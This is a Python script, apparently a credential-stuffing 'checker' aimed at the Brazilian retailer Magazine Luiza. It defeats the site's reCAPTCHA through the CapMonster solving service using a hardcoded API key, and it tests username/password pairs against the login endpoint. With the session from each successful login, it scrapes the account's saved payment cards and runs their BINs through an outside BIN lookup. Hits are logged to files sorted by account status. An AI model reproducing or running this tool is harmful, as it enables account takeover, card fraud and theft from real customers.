try:    
    import os
    import re
    import time
    import uuid
    import base64
    import string
    import random
    import string
    import secrets
    import urllib3
    import requests
    import urllib.parse
    from requests.exceptions import ProxyError, ConnectionError
    from playwright.sync_api import sync_playwright
    from capmonster_python import RecaptchaV3Task
    from bs4 import BeautifulSoup
    
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception as e:
    print(f"PUGNO - {e}")
    exit()
capmonster_key = "c9123f96cfe19602dcfb8954b9ed20ba"
website_url = "https://sacola.magazineluiza.com.br"
website_key = "6LdZgd8nAAAAACORQAbrn5mzgAXTgwTmp3pSjPKe"

def create_task():
    response = requests.post('https://api.capmonster.cloud/createTask', verify= False, json={
        "clientKey": capmonster_key,
        "task": {
            "type": "RecaptchaV3TaskProxyless",
            "websiteURL": website_url,
            "websiteKey": website_key
        }
    })
    return response.json()['taskId']

def get_task_result(task_id):
    while True:
        response = requests.post('https://api.capmonster.cloud/getTaskResult', verify= False, json={
            "clientKey": capmonster_key,
            "taskId": task_id
        })
        result = response.json()
        if result['status'] == "ready":
            return result['solution']['gRecaptchaResponse']
        time.sleep(2)  # Espera 2 segundos antes de verificar novamente

def bypass_captcha():
    try:
        task_id = create_task()
        bypass = get_task_result(task_id)
        return bypass
    except Exception as error:
        print('Erro ao resolver CAPTCHA:', error)




def get_uuid():
    with sync_playwright() as p:
        # Configurações do proxy para usar o mitmproxy
        proxy_config = {
            "server": 'http://localhost:8080',  # Assumindo que o mitmproxy está rodando nesta porta
        }
        
        # Lançando o navegador em modo headless com configuração de proxy
        browser = p.chromium.launch(headless=True, proxy=proxy_config)

        # Cria um novo contexto com um viewport definido
        context = browser.new_context(viewport={"width": 10, "height": 10})

        # Cria uma nova página
        page = context.new_page()

        page.goto("https://sacola.magazineluiza.com.br/#/identificacao")

 
        browser.close()

def checkbin(bin):
    headers = {
    'Host': 'data.handyapi.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
    }

    consulta = requests.get(f'https://data.handyapi.com/bin/{bin}', headers=headers, verify=False).json()
    tipo = consulta['Type']
    banco = consulta['Issuer']
    nivel = consulta['CardTier']
    pais = consulta['Country']['Name']
    return f'{bin} - [{tipo}, {banco}, {nivel}, {pais}]'

def generate_traceparent():
    trace_id = uuid.uuid4().hex[:32]  # Gera um UUID e pega os primeiros 32 caracteres para o trace-id
    parent_id = uuid.uuid4().hex[:16]  # Gera outro UUID e pega os primeiros 16 caracteres para o parent-id
    version = '00'  # Versão padrão do traceparent
    flag = '01'  # Flag que geralmente indica que o trace está gravado
    
    return f"{version}-{trace_id}-{parent_id}-{flag}"

def chk(usuario, senha):
    retorno = f'{usuario}|{senha}'
    get_uuid()
    with open('resultado/captured_uuids.txt', 'r') as file:
        uuid = file.readline().strip()
    try:
        bypass = bypass_captcha()

        headers = {
            'Host': 'sacola.magazineluiza.com.br',
            'sec-ch-ua': '"Brave";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'content-type': 'application/json',
            'traceparent': generate_traceparent(),
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'accept': '*/*',
            'sec-gpc': '1',
            'accept-language': 'en-US,en;q=0.8',
            'origin': 'https://sacola.magazineluiza.com.br',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://sacola.magazineluiza.com.br/',
            'priority': 'u=1, i',
        }

        json_data = {
            'login': usuario,
            'password': senha,
            'channel': 'magazineluiza',
            'captcha_token': bypass,
            'tmx_national_sessionId': uuid,
        }
        
        login = requests.post('https://sacola.magazineluiza.com.br/customer/login/', headers=headers, json=json_data, timeout=5, verify=False)
        
        if login.status_code == 200 and '{"id":' in login.text:
            data = login.json()
            idMl2 = data['id']
            headers = {
                'Host': 'www.magazineluiza.com.br',
                'Cookie': f'ml2_sid={idMl2}; ml2_sid_c=%7B%22id%22%3A%20%22{idMl2}%22%7D;',
                'pragma': 'no-cache',
                'cache-control': 'no-cache',
                'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-language': 'pt-BR,pt;q=0.9',
                'priority': 'u=0, i',
            }

            cartoes = requests.get('https://www.magazineluiza.com.br/seu-espaco/cartoes/',  headers=headers, timeout=5, verify=False)
            if 'not-found-card' in cartoes.text:
                results = "[cartão não encontrado]"
            elif 'list-cards-card' in cartoes.text:
                soup = BeautifulSoup(cartoes.text, 'html.parser')
                cards = soup.find_all('div', class_='info-variables-cards')

                bins = []
                results = []
                for card in cards:
                    number_text = card.find_all('p')[1].text  # Pega o texto do segundo <p>, que contém o número
                    bin_number = re.search(r'\d{6}', number_text)
                    if bin_number:
                        bin_number = bin_number.group()
                        bins.append(bin_number)
                        result = checkbin(bin_number)  # Chama a função checkbin para cada BIN encontrado
                        results.append(result)

            else:
                results = "[erro ao buscar cartões]"

            print(f'{retorno} - {results}')
            with open('resultado/com-conta.txt', 'a+') as file:
                file.write(f'{retorno} - {results}\n')
            return True

        elif 'Invalid register' in login.text:
            data = login.json()
            error_message = data['error_message']
            print(retorno + f' - {error_message}')
            with open('resultado/live-erro.txt', 'a+') as file:
               file.write(retorno + '\n')
            return True

        elif login.status_code == 401 and 'error_message' in login.text:
            data = login.json()
            error_message = data['error_message']
            print(retorno + f' - {error_message}')
            with open('resultado/die.txt', 'a+') as file:
               file.write(retorno + '\n')
            return True
        
        else:
            print(retorno + f' - Erro desconhcido' + login.status_code)
            with open('resultado/reteste.txt', 'a+') as file:
                file.write(retorno + '\n')
            return False

    except Exception as i:
        print(i)
        return True